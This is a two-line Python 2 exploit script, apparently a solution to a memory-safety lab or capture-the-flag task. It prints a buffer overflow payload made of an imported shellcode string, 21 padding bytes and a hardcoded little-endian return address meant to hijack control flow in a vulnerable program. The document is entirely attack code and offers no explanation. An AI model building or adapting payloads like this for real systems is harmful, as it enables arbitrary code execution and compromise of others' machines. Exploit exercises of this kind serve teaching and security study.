from shellcode import shellcode
print shellcode + '\x01'*21 + '\x80\x95\xfe\xff' #'\xff\xfe\x95\x80'
